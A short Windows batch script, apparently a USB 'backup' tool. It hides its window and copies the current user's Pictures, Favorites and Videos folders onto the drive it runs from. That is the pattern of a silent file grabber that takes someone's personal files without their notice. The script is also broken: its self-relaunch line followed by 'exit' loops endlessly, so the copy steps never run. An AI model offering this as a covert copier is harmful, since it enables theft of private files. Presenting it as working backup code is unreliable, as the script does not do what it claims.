@echo off
:: Minimize window
start /min cmd /c "%~f0"
exit

:: Define variables
set "backupcmd=xcopy /s /c /d /e /h /i /r /y"
set "drive=%~d0"

:: Ensure target folder exists
mkdir "%drive%\all"

:: Copy files
%backupcmd% "%USERPROFILE%\Pictures" "%drive%\all\My Pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
%backupcmd% "%USERPROFILE%\Videos" "%drive%\all\Vids"

:: Clean up
cls
echo Backup Completed!
exit
